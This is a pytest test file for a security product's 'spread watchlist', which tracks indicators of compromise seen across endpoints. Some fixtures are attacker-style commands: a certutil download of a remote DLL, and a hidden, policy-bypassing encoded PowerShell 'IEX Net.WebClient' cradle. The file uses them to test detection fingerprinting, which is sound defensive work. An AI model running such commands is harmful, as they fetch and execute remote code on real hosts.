"""P1.10a · Spread Watchlist — the owner-locked contract.

Every test here asserts a FROZEN decision, not a happy path:

  1  indicator identity keys (raw command line / src_ip / username are
     NOT identity)
  2  evidence-gated enrollment, and enrollment != malicious verdict
  3  UNKNOWN endpoint identity is retained but NEVER counts; a source IP
     is never accepted as an endpoint
  4  threshold evidence at 2 / 3 / 5 / 10, emitted once each, with the
     VEEE cap left untouched and evidence progression preserved past it
  8  idempotency — a repeat sighting from the same endpoint, and a
     replay of the same raw event, cannot inflate spread
  9  provenance on every spread assertion
 10  spread is not lateral movement, not compromise, not patient zero
"""
from __future__ import annotations

import os
import sys

import pytest

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from detection_content import xdr_spread_watchlist as swl  # noqa: E402
from detection_content.xdr_ice import _signal_from_canonical  # noqa: E402
from detection_content.xdr_veee import compute_verdict  # noqa: E402

TENANT = "test-spread"


# ── fixtures: an in-memory async Mongo stand-in ───────────────────
class _FakeCollection:
    def __init__(self):
        self.rows: list[dict] = []

    async def find_one(self, q, projection=None):
        for r in self.rows:
            if all(r.get(k) == v for k, v in q.items()
                   if not isinstance(v, dict)):
                return dict(r)
        return None

    async def insert_one(self, doc):
        self.rows.append(dict(doc))

    async def update_one(self, q, update):
        for r in self.rows:
            if all(r.get(k) == v for k, v in q.items()):
                for k, v in (update.get("$set") or {}).items():
                    if "." in k:
                        head, tail = k.split(".", 1)
                        r.setdefault(head, {})[tail] = v
                    else:
                        r[k] = v
                for k, v in (update.get("$inc") or {}).items():
                    r[k] = int(r.get(k) or 0) + v
                for k, v in (update.get("$push") or {}).items():
                    r.setdefault(k, []).append(v)
                return
        raise AssertionError(f"no row matched {q}")

    async def create_index(self, *a, **kw):
        return None


class _FakeDb:
    def __init__(self):
        self._c: dict[str, _FakeCollection] = {}

    def __getitem__(self, name):
        return self._c.setdefault(name, _FakeCollection())


def _canonical(*, hostname: str | None, sha256: str = "",
               process: str = "", command_line: str = "",
               dest_ip: str = "", dns_query: str = "",
               src_ip: str = "10.0.0.9", username: str = "svc_a",
               host_id: str | None = None,
               event_id: str = "", raw_line: str = "") -> dict:
    return {
        "event_id": event_id or f"ev-{hostname}-{sha256[:6]}-{dest_ip}",
        "tenant_id": TENANT,
        "source_vendor": "TestVendor", "source_product": "TestProduct",
        "source_event_id": "4711",
        "event_time": "2026-06-11T09:00:00+00:00",
        "host": {"hostname": hostname or "",
                  "host_id": host_id if host_id is not None else (hostname or ""),
                  "ip_addresses": ["10.4.9.31"]},
        "identity": {"username": username},
        "process": {"name": process, "pid": None, "ppid": None,
                     "executable_path": "", "command_line": command_line,
                     "hashes": {"sha256": sha256} if sha256 else {}},
        "network": {"src_ip": src_ip, "dest_ip": dest_ip,
                     "dns_query": dns_query, "protocol": "TCP"},
        "file": {"path": "", "name": "", "action": "", "hashes": {}},
        "security": {"signature": {"id": "4711", "name": "t"},
                      "severity": 8, "severity_band": "HIGH"},
        "provenance": {"trace_id": "tr", "collector_id": "col",
                        "integration_id": "ds"},
        "raw_ref": {"line": raw_line or f"RAW|{hostname}|{sha256}|{dest_ip}"},
        "additional_fields": {},
    }


MATCHED = {"matched": True, "rule_id": "DET-EX-002",
           "detections": [{"rule_id": "DET-EX-002"}]}
NO_MATCH = {"matched": False, "rule_id": None, "detections": []}
V_HIGH = {"label": "SUSPICIOUS", "score": 70}
V_LOW = {"label": "INCONCLUSIVE", "score": 5}
IUE = {"severity_hint": "HIGH"}


async def _observe(db, canonical, *, detection=MATCHED, verdict=V_HIGH):
    return await swl.observe(db, canonical, iue=IUE, detection=detection,
                             verdict=verdict, trace_id="tr", tenant_id=TENANT)


# ── 1 · indicator identity keys ───────────────────────────────────
def test_identity_keys_are_exactly_the_locked_set():
    assert swl.INDICATOR_TYPES == (
        "file_sha256", "file_sha1", "file_md5", "dest_ip", "domain",
        "process_identity", "cmdline_fingerprint")


def test_src_ip_and_username_are_never_indicators():
    can = _canonical(hostname="h1", src_ip="10.1.2.3", username="alice",
                      dest_ip="203.0.113.10")
    values = {i["indicator_value"] for i in swl.extract_indicators(can)}
    assert "10.1.2.3" not in values
    assert "alice" not in values
    assert "203.0.113.10" in values


def test_raw_command_line_is_not_the_spread_key():
    """The same tooling under a different user and path must produce the
    SAME fingerprint, or every host variation becomes its own indicator."""
    a = swl.cmdline_fingerprint(
        r'"C:\Users\alice\AppData\Local\Temp\certutil.exe" -urlcache '
        r'-split -f http://198.51.100.7/a.dll')
    b = swl.cmdline_fingerprint(
        r'C:\Users\bob\Downloads\certutil.exe -urlcache -split -f '
        r'http://203.0.113.9/a.dll')
    assert a is not None and b is not None
    assert a[0] == b[0], (a[1], b[1])
    assert a[0] != swl.cmdline_fingerprint(
        "robocopy.exe D:\\data E:\\backup /MIR")[0]


def test_encoded_powershell_fingerprints_to_the_decoded_tooling():
    """Reuses the existing DIE normalizer: the same script encoded
    differently must not look like two different indicators."""
    plain = swl.cmdline_fingerprint("IEX (New-Object Net.WebClient)")
    encoded = swl.cmdline_fingerprint(
        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOA"
        "GUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA")
    assert plain is not None and encoded is not None
    assert plain[0] == encoded[0]


def test_shell_wrapper_is_stripped_so_the_script_is_the_indicator():
    """`powershell.exe <script>` and `powershell.exe -enc <same script>`
    are the same tooling reuse.  Reported by the P1.10a test agent
    (iteration_86, minor): the DIE normalizer drops the interpreter only
    on the encoded branch, so the two fingerprints diverged."""
    script = "IEX (New-Object Net.WebClient)"
    encoded_b64 = ("SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuA"
                    "FcAZQBiAEMAbABpAGUAbgB0ACkA")
    bare = swl.cmdline_fingerprint(script)
    wrapped = swl.cmdline_fingerprint(f"powershell.exe {script}")
    hardened = swl.cmdline_fingerprint(
        f"powershell.exe -nop -w hidden -ep bypass -enc {encoded_b64}")
    assert bare is not None
    assert bare[0] == wrapped[0] == hardened[0], (
        bare[1], wrapped[1], hardened[1])
    # The interpreter is NOT lost — it stays its own indicator.
    can = _canonical(hostname="h1", process="powershell.exe",
                      command_line=f"powershell.exe {script}")
    types = {i["indicator_type"]: i["indicator_value"]
              for i in swl.extract_indicators(can)}
    assert types["process_identity"] == "powershell.exe"
    assert types["cmdline_fingerprint"] == bare[0]


def test_non_shell_binary_is_never_stripped():
    fp = swl.cmdline_fingerprint(
        "certutil.exe -urlcache -split -f http://198.51.100.7/a.dll")
    assert fp is not None
    assert fp[1].startswith("certutil.exe ")


def test_single_token_command_line_is_not_a_separate_indicator():
    assert swl.cmdline_fingerprint("certutil.exe") is None
    assert swl.cmdline_fingerprint("") is None


# ── 2 · evidence-gated enrollment ─────────────────────────────────
def test_enrollment_requires_detection_match_or_verdict_above_inconclusive():
    ok, reason = swl.enrollment_admitted(MATCHED, V_LOW)
    assert ok and "detection matched" in reason
    ok, reason = swl.enrollment_admitted(NO_MATCH, {"label": "LIKELY_BENIGN",
                                                     "score": 25})
    assert ok and "above INCONCLUSIVE" in reason
    ok, reason = swl.enrollment_admitted(NO_MATCH, {"label": "INCONCLUSIVE",
                                                     "score": 24})
    assert not ok and "not admitted" in reason
    ok, _ = swl.enrollment_admitted(None, None)
    assert not ok


@pytest.mark.asyncio
async def test_not_admitted_records_nothing():
    db = _FakeDb()
    res = await _observe(db, _canonical(hostname="h1", dest_ip="203.0.113.1"),
                         detection=NO_MATCH, verdict=V_LOW)
    assert res["state"] == "NOT_ADMITTED"
    assert res["sightings_recorded"] == 0
    assert db[swl.WATCHLIST_COLLECTION].rows == []


@pytest.mark.asyncio
async def test_enrollment_is_not_a_malicious_verdict():
    db = _FakeDb()
    await _observe(db, _canonical(hostname="h1", dest_ip="203.0.113.1"))
    doc = db[swl.WATCHLIST_COLLECTION].rows[0]
    assert doc["status"] == "WATCHING"
    assert "not a malicious verdict" in \
        doc["enrollment_basis"]["note"].lower()
    # The plane emits no score and no label of its own.
    assert "score" not in doc and "verdict" not in doc


# ── 3 · endpoint identity ─────────────────────────────────────────
def test_hostname_is_the_endpoint_identity():
    ident, state = swl.endpoint_identity(_canonical(hostname="HYD-SRV31"))
    assert (ident, state) == ("hyd-srv31", "OBSERVED")


def test_ip_is_never_accepted_as_an_endpoint_identity():
    can = _canonical(hostname=None, host_id="10.4.9.31")
    assert swl.endpoint_identity(can) == (None, "UNKNOWN")
    can = _canonical(hostname=None, host_id="")
    assert swl.endpoint_identity(can) == (None, "UNKNOWN")
    can = _canonical(hostname="UNKNOWN", host_id="UNKNOWN")
    assert swl.endpoint_identity(can) == (None, "UNKNOWN")


@pytest.mark.asyncio
async def test_unknown_endpoint_is_retained_but_never_counts():
    db = _FakeDb()
    ip = "203.0.113.55"
    await _observe(db, _canonical(hostname="host-a", dest_ip=ip))
    res = await _observe(db, _canonical(hostname=None, host_id="10.9.9.9",
                                         dest_ip=ip,
                                         raw_line="RAW|unknown-host|x"))
    doc = db[swl.WATCHLIST_COLLECTION].rows[0]
    # retained
    assert res["sightings_recorded"] == 1
    assert len(db[swl.SIGHTINGS_COLLECTION].rows) == 2
    sighting = db[swl.SIGHTINGS_COLLECTION].rows[-1]
    assert sighting["endpoint_identity_state"] == "UNKNOWN"
    assert sighting["counts_toward_spread"] is False
    assert sighting["context"]["src_ip"]           # context preserved
    # but never counted, and never establishes spread
    assert doc["endpoint_count"] == 1
    assert doc["unknown_endpoint_sightings"] == 1
    assert doc["status"] == "WATCHING"
    assert res["spread"] == []
    assert res["correlation_matches"] == []


@pytest.mark.asyncio
async def test_two_unknown_hosts_are_not_two_endpoints():
    db = _FakeDb()
    ip = "203.0.113.56"
    for n in range(2):
        await _observe(db, _canonical(hostname=None, host_id="",
                                       dest_ip=ip, raw_line=f"RAW|unk|{n}"))
    doc = db[swl.WATCHLIST_COLLECTION].rows[0]
    assert doc["endpoint_count"] == 0
    assert doc["unknown_endpoint_sightings"] == 2
    assert doc["thresholds_emitted"] == []
    assert doc["epistemic_state"]["endpoint_cardinality"] == "UNKNOWN"


# ── 4 · thresholds ────────────────────────────────────────────────
def test_threshold_ladder_is_the_locked_set():
    assert swl.THRESHOLDS == ((2, "SPREAD_CONFIRMED"),
                              (3, "SPREAD_ESCALATING"),
                              (5, "SPREAD_SIGNIFICANT"),
                              (10, "SPREAD_WIDESPREAD"))


@pytest.mark.asyncio
async def test_evidence_emitted_once_per_threshold_only():
    db = _FakeDb()
    ip = "203.0.113.57"
    emitted: list[int] = []
    for n in range(1, 13):
        res = await _observe(db, _canonical(hostname=f"host-{n}", dest_ip=ip,
                                             raw_line=f"RAW|host-{n}|{ip}"))
        emitted += [s["threshold"] for s in res["spread"]]
    doc = db[swl.WATCHLIST_COLLECTION].rows[0]
    assert emitted == [2, 3, 5, 10]
    assert doc["thresholds_emitted"] == [2, 3, 5, 10]
    assert doc["endpoint_count"] == 12
    assert doc["status"] == "SPREAD_WIDESPREAD"
    # Evidence progression survives past the ladder AND past the VEEE cap.
    assert len(doc["spread_evidence"]) == 4


def test_veee_correlation_cap_is_not_violated_by_spread_evidence():
    """Spread must never inflate the score past the existing policy."""
    detection = {"matched": True, "rule_id": "DET-EX-002"}
    iue = {"severity_hint": "LOW"}
    many = {"state": "MATCHED", "matches": [{"match_id": f"m{i}"}
                                             for i in range(50)]}
    three = {"state": "MATCHED", "matches": [{"match_id": f"m{i}"}
                                              for i in range(3)]}
    assert (compute_verdict({}, detection, iue, many)["score"]
            == compute_verdict({}, detection, iue, three)["score"])
    contributors = compute_verdict({}, detection, iue, many)["contributors"]
    ice_w = next(c["weight"] for c in contributors if c["source"] == "ice.matches")
    assert ice_w == 60


# ── 8 · idempotency ───────────────────────────────────────────────
@pytest.mark.asyncio
async def test_repeat_sighting_from_same_endpoint_does_not_inflate():
    db = _FakeDb()
    ip = "203.0.113.58"
    await _observe(db, _canonical(hostname="host-a", dest_ip=ip,
                                   raw_line="RAW|a"))
    for n in range(5):
        await _observe(db, _canonical(hostname="host-a", dest_ip=ip,
                                       raw_line=f"RAW|a|{n}"))
    doc = db[swl.WATCHLIST_COLLECTION].rows[0]
    assert doc["endpoint_count"] == 1
    assert doc["thresholds_emitted"] == []
    assert doc["status"] == "WATCHING"


@pytest.mark.asyncio
async def test_replay_of_the_same_raw_event_is_deduped():
    db = _FakeDb()
    ip = "203.0.113.59"
    line = "RAW|host-a|verbatim"
    first = await _observe(db, _canonical(hostname="host-a", dest_ip=ip,
                                           raw_line=line, event_id="e1"))
    # A replay regenerates the canonical event id but the raw line is
    # byte-identical, so it must NOT create a second sighting.
    again = await _observe(db, _canonical(hostname="host-a", dest_ip=ip,
                                           raw_line=line, event_id="e2"))
    doc = db[swl.WATCHLIST_COLLECTION].rows[0]
    assert first["sightings_recorded"] == 1
    assert again["sightings_recorded"] == 0
    assert again["duplicate_sightings_ignored"] == 1
    assert doc["sighting_count"] == 1
    assert doc["duplicate_sightings"] == 1


@pytest.mark.asyncio
async def test_duplicate_second_endpoint_event_emits_no_second_evidence():
    db = _FakeDb()
    ip = "203.0.113.60"
    await _observe(db, _canonical(hostname="host-a", dest_ip=ip, raw_line="A"))
    res1 = await _observe(db, _canonical(hostname="host-b", dest_ip=ip,
                                          raw_line="B"))
    res2 = await _observe(db, _canonical(hostname="host-b", dest_ip=ip,
                                          raw_line="B"))
    assert len(res1["correlation_matches"]) == 1
    assert res2["correlation_matches"] == []
    doc = db[swl.WATCHLIST_COLLECTION].rows[0]
    assert doc["endpoint_count"] == 2
    assert doc["thresholds_emitted"] == [2]


# ── 9 · provenance ────────────────────────────────────────────────
@pytest.mark.asyncio
async def test_every_spread_assertion_carries_full_provenance():
    db = _FakeDb()
    ip = "203.0.113.61"
    await _observe(db, _canonical(hostname="host-a", dest_ip=ip, raw_line="A"))
    res = await _observe(db, _canonical(hostname="host-b", dest_ip=ip,
                                         raw_line="B"))
    match = res["correlation_matches"][0]
    for key in ("match_id", "rule_id", "trace_id", "tenant_id",
                 "source_event_id", "emitted_at", "evidence_level", "claim"):
        assert match.get(key), key
    spread = match["spread"]
    for key in ("watch_id", "indicator_type", "indicator_value",
                 "match_basis", "threshold", "status", "endpoint_count",
                 "endpoints", "first_seen", "last_seen",
                 "triggering_endpoint", "unknown_endpoint_sightings"):
        assert key in spread, key
    sighting = db[swl.SIGHTINGS_COLLECTION].rows[0]
    for key in ("sighting_id", "watch_id", "indicator_type", "match_basis",
                 "endpoint_identity_state", "canonical_event_id",
                 "event_digest", "trace_id", "at", "context",
                 "admission_reason"):
        assert key in sighting, key


# ── 10 · no overclaiming ──────────────────────────────────────────
@pytest.mark.asyncio
async def test_claim_says_observed_across_not_spread_to():
    db = _FakeDb()
    ip = "203.0.113.62"
    await _observe(db, _canonical(hostname="host-a", dest_ip=ip, raw_line="A"))
    res = await _observe(db, _canonical(hostname="host-b", dest_ip=ip,
                                         raw_line="B"))
    match = res["correlation_matches"][0]
    assert match["claim"] == ("Indicator observed across 2 distinct "
                              "endpoint identities.")
    lowered = (match["claim"] + match["honesty_note"]).lower()
    assert "lateral movement" not in match["claim"].lower()
    assert "not a claim of lateral movement" in lowered
    assert match["attack_techniques"] == []


@pytest.mark.asyncio
async def test_plane_emits_no_verdict_and_no_incident():
    db = _FakeDb()
    ip = "203.0.113.63"
    await _observe(db, _canonical(hostname="host-a", dest_ip=ip, raw_line="A"))
    res = await _observe(db, _canonical(hostname="host-b", dest_ip=ip,
                                         raw_line="B"))
    assert "verdict" not in res and "score" not in res
    assert "incident_id" not in res
    assert res["correlation_matches"][0]["evidence_level"] == \
        "CORRELATION_OBSERVED"
    # Everything it wrote went to the evidence planes only.
    assert set(db._c) == {swl.WATCHLIST_COLLECTION, swl.SIGHTINGS_COLLECTION,
                          swl.CORRELATION_MATCHES_COLLECTION}


# ── ICE flat-shape regression ─────────────────────────────────────
def test_ice_signal_reads_both_canonical_network_shapes():
    flat = _signal_from_canonical(
        _canonical(hostname="HYD-SRV31", dest_ip="203.0.113.9"),
        {"severity_hint": "HIGH"})
    assert flat["dst_ip"] == "203.0.113.9"
    assert flat["host_id"] == "HYD-SRV31"
    assert flat["fields"]["src_ip"] == "10.0.0.9"

    nested = _signal_from_canonical(
        {"event_id": "e", "network": {"src": {"ip": "10.1.1.1"},
                                        "dst": {"ip": "8.8.8.8"}},
         "security": {"signature": {"id": "1"}}},
        {"severity_hint": "LOW"})
    assert nested["dst_ip"] == "8.8.8.8"
    assert nested["host_id"] == "10.1.1.1"
